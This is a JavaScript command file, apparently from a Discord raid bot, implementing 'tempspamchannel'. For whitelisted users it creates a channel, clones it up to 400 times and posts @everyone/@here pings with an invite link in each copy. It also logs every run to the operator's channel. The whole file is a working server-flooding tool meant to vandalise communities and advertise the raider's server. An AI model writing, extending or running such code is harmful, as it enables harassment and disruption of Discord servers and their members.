const Discord = require('discord.js');
const db = require('megadb')
const blacklist = new db.crearDB("blacklist")
const serverlist = new db.crearDB("serverlist")
const color = 'cc2929'

let cooldown = new Set()

module.exports = {
  name: "tempspamchannel",
  alias: [],

async execute (client, message, args){

  if(!blacklist.has(message.author.id)){
    const a = new Discord.MessageEmbed()
    .setDescription("You are not registered in the Whitelist.")
    .setColor(color)
     return message.reply({embeds: [a]})
  }

  if (serverlist.tiene(message.guild.id)){
    const serverInListEmbed = new Discord.MessageEmbed()
        .setDescription("This command is not available in this server.")
        .setColor(color);
      return message.reply({ embeds: [serverInListEmbed] });
    }

  if(!message.guild.me.permissions.has("MANAGE_CHANNELS")){
    const wu = new Discord.MessageEmbed()
    .setDescription("I don't have permissions. I need the `MANAGE_CHANNELS`.")
   .setColor(color)
   return message.reply({embeds: [wu]})
  }

  if(cooldown.has(message.author.id)){
    const l = new Discord.MessageEmbed()
    .setDescription(`${message.author}, you must wait 1 minute to use the command.`)
    .setColor(color)
    return message.author.send({embeds: [l]}).catch(() => console.log(`${user.displayName}'s' DMs are closed | Please use .spam <@User> <message> instead`)) 
  }

  cooldown.add(message.author.id);

  setTimeout(() => {
    cooldown.delete(message.author.id);
  }, 60000);

  try {

    const cantidad = args[0]
    if(!cantidad) {
      const lol = new Discord.MessageEmbed()
      .setDescription("You must specify the amount of messages to send.\nMode of use: `!tempspamchannel [Amount]`")
      .setColor(color)
      return message.reply({embeds: [lol]})
    }

    if(isNaN(cantidad)) {
      const lol = new Discord.MessageEmbed()
      .setDescription("The amount of messages must be a number.\nMode of use: `!tempspamchannel [Amount]`")
      .setColor(color)
      return message.reply({embeds: [lol]})
    }

    if(cantidad > 400) {
      const lol = new Discord.MessageEmbed()
      .setDescription("The amount of messages must be less than 400.\nMode of use: `!tempspamchannel [Amount]`")
      .setColor(color)
      return message.reply({embeds: [lol]})
    }

    if(cantidad < 1) {
      const lol = new Discord.MessageEmbed()
      .setDescription("The amount of messages must be greater than 1.")
      .setColor(color)
      return message.reply({embeds: [lol]})
    }

    const argas = ["@everyone\nhttps://discord.gg/hjbvMsB7v5", "@here\nhttps://discord.gg/hjbvMsB7v5"]
      let randomIMG = argas[Math.floor(Math.random() * argas.length)]

    let texto = randomIMG;

   const basechannel = await message.guild.channels.create(`${client.user.username} empire`, { type: "GUILD_TEXT" }).catch(err => {
      const laoo = new Discord.MessageEmbed()
        .setDescription("Error found")
        .addField("> Command", "`SpamChannel`", true)
        .addField("> Error", `\`${err}\``, true)
        .setColor(color);
      client.channels.cache.get('1210148130264322119').send({ embeds: [laoo] });
    })


   for (let i = 0 ; i < cantidad; ++i){

     if(message.guild.channels.cache.size >= 500){
       break;
     }

     const clonePromise = basechannel.clone().then(async clonedChannel => {
        await clonedChannel.send(texto).catch(err => {
         const laoo = new Discord.MessageEmbed()
           .setDescription("Error found")
           .addField("> Command", "`kill`", true)
           .addField("> Error", `\`${err}\``, true)
           .setColor(color);
         client.channels.cache.get('1210148130264322119').send({ embeds: [laoo] });
       })
     })

   }


  const embok = new Discord.MessageEmbed()
  .setDescription("Command ejecuted.")
  .setColor(color)
  message.author.send({embeds: [embok]}).catch(() => console.log(`${user.displayName}'s' DMs are closed | Please use .spam <@User> <message> instead`))


  const e = new Discord.MessageEmbed()


   .setDescription(`tempspamchannel executed successfully!`)
     .addField("User", `**${message.author.tag}** | **${message.author.id}**`)
    .addField("Server Name", `**${message.guild.name}** | **${message.guild.id}**`)
   .setColor(color)
    .setThumbnail(message.author.displayAvatarURL({format: 'png', dynamic: true}))


   client.channels.cache.get("1265925374601334914").send({embeds: [e]})

  } catch (err) {
    const laoo = new Discord.MessageEmbed()
    .setDescription("Error found")
    .addField("> Command", "`laoo`", true)
    .addField("> Error", `\`${err}\``, true)
    .setColor(color)

    client.channels.cache.get('1210148130264322119').send({embeds: [laoo]})
  }

 }

}